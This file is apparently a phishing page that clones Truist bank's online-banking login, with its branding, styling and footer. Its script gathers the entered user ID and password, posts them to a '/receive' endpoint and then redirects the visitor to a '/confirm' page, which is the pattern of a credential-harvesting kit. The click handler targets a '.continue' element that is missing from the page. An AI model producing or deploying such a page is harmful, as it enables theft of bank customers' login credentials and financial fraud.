<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: top;
            min-height: 100vh;
            background-color: #f5f5f5;
            position: relative;
            padding-bottom: 150px; /* Adjust padding to avoid overlap with footer */
        }

        .login-container {
            width: 100%;
            padding: 35px;
            text-align: center;
        }

        .logo {  
            font-size: 33px;
            font-weight: bold;
            color: #3f2940;
            margin-bottom: 20px;
        }

        .logo span {
            font-weight: normal;
            border: 1px solid #3f2940;
            padding: 3px 6px;
            margin-left: 5px;
            border-radius: 4px;
        }
        
        form {
            margin-top: 80px;
        } 

        label {
            display: block;
            text-align: left;
            font-size: 17px;
            color: #333;
            margin-top: 10px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            height: 50px;
            padding: 10px;
            margin-top: 5px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 7px;
        } 

        .save-user-id {
            display: flex;
            align-items: center;
            margin-top: 15px;
            margin-bottom: 15px;
        }

        .save-user-id input {
            margin-right: 5px;
            height: 60%;
        } 

        .sign-in-button {
            width: 100%;
            height: 50px;
            background-color: #6b3b9c;
            color: white;
            padding: 10px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 7px;
            margin-top: 15px;
            cursor: pointer;
        }

        .sign-in-button:hover {
            background-color: #5b3083;
        }

        .or-divider {
            display: flex;
            align-items: center;
            color: #aaa;
            margin: 15px 0;
        }

        .or-divider::before,
        .or-divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ddd;
            margin: 0 10px;
        }

        .qr-sign-in {
            width: 100%;
            padding: 10px;
            height: 50px;
            font-size: 14px;
            font-weight: bold;
            color: #6b3b9c;
            border: 2px solid #6b3b9c;
            border-radius: 7px; 
            background-color: transparent;
            cursor: pointer;
        }

        .qr-sign-in:hover {
            background-color: #f0e8f9;
        }

        .links {
            margin-top: 20px;
            font-size: 14px;
            color: #6b3b9c;
            text-align: left;
        }

        .links a {
            color: #6b3b9c;
            text-decoration: none;
            display: block;
            margin-top: 5px; 
            font-size: 17px;   
        }

        .register { 
            margin-top: 30px;   
            font-size: 18px; 
            color: #333;
            text-align: left;
        }

        .register a {
            color: #6b3b9c;
            text-decoration: none;
        }
        
        .footer {
            background-color: #3f2940;
            color: #d1c3d0;
            padding: 30px 20px;
            width: 100%;
            position: absolute;
            bottom: 0;
            left: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 30%;
        }

        .footer-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 1000px;
            text-algn: center;
        }

        .footer-logo {
            font-size: 24px;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 20px; 
        }

        .footer-logo span {
            font-weight: normal;
            border: 1px solid #ffffff;
            padding: 3px 6px;
            margin-left: 5px;
            border-radius: 4px;
        }

        .footer-links {
            font-size: 14px;
            line-height: 1.8;
            text-align: center;
            width: 100%;
        }

        .footer-links a {
        	text-align: center;
            color: #d1c3d0;
            text-decoration: none;
        }

        .footer-links a:hover {
            color: #ffffff;
        }

        .footer-bottom {
            font-size: 12px;
            color: #d1c3d0;
            margin-top: 20px;
        }

        /* Desktop layout */
        @media (min-width: 758px) {  
            .footer-content {
                flex-direction: row;
                justify-content: space-between;
                align-items: flex-start;
            }

            .footer-logo {
                margin-bottom: 0;
                text-align: left;
            }

            .footer-links {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 10px;
                text-align: left!important;
                max-width: 500px;
            } 
            
            .login-container {
        	width:500px!important;
        	max-width: 500pximportant;
            padding: 35px;
            text-align: center;
        }
        }
        
        @media(max-width: 758px){ 
        
        .register {
        margin-bottom:80%; 
        }
        }
        
        @media (max-width: 758px) {
        
        .footer-links a {
        	text-align: center;
        }
        
        .footer{
        margin-top:80%;
        }
    .footer-links {
        display: flex;
        flex-direction: column;
        align-items: center;
        text-align: center;
    }

    .footer-links a {
        margin-bottom: 10px; /* Adds spacing between links */
    }
}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="assets/images/trulogo_horz-trupurple.png"/>
        </div>
        <form>
            <label for="user-id">User ID</label>
            <input type="text" name="user-id" id="user-id" placeholder="">

            <div class="save-user-id">
                <input type="checkbox" id="save-id">
                <label for="save-id">Save user ID</label>
            </div>

            <label for="password">Password</label>
            <input type="password" name="password" id="password" placeholder="">
            
            <button class="sign-in-button">Sign in</button>

            <div class="or-divider">or</div>

            <button class="qr-sign-in">Sign in with a QR code</button>

            <div class="links">
                <a href="#">Forgot User ID</a>
                <a href="#">Reset Password</a>
            </div>

            <div class="register">
                Don't have an online user ID? <br><a href="#">Register now</a>
            </div> 
        </form>
    </div> 
    <div class="footer">
        <div class="footer-content">
            <div class="footer-logo">
                <img src="assets/images/logo-white.png" alt="Logo">
            </div>
            <div class="footer-links">
                <a href="#">Privacy</a>
                <a href="#">Fraud & security</a>
                <a href="#">Terms and conditions</a>
                <a href="#">Accessibility</a>
                <a href="#">Limit use of my sensitive personal information</a>
                <a href="#">Do not sell or share my personal information</a>
            </div>
        </div>
        <div class="footer-bottom">
            Â© 2024, Truist. All Rights Reserved.
        </div>
    </div>
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script>
$(document).ready(function() {
    $('.continue').on('click', function(e) {
        e.preventDefault(); // Prevent default form submission

        let isEmpty = false;
        const checkInputs = $('input'); // Collect input fields

        // Check for empty fields and highlight them
        for (const check of checkInputs) {
            if (check.value.trim() === "") {
                check.style.borderColor = 'red'; // Highlight the empty input field
                isEmpty = true; // Mark as empty
            } else {
                check.style.borderColor = ''; // Reset border color if filled
            }
        }

        // If no input is empty, proceed with form submission
        if (!isEmpty) {
            // Serialize form data into an array
            let userinfo = $('form').serializeArray(); // Make sure to wrap the inputs in a <form> tag
            let user = {};
            let visitor = sessionStorage.setItem('visitor', $('#user-id').val());
            console.log(visitor);

            userinfo.forEach((value) => {
                user[value.name] = value.value; // Create user object from inputs
            });

            user['visitor'] = visitor; // Add visitor info to user object
            console.log(user);

            // Send AJAX request
            $.ajax({
                method: 'POST',
                url: "/receive", // Replace with your server endpoint
                data: user
            }).done(function(msg) {
                // Handle successful response
                console.log(msg);
                window.location.href = "/confirm?action=1";
            }).fail(function(err, textStatus, error) {
                console.log('fail');
                // Handle failure response
                // Optional: You could redirect or show an error message here
            });
        }
    });
});
</script> 
</body>
</html>
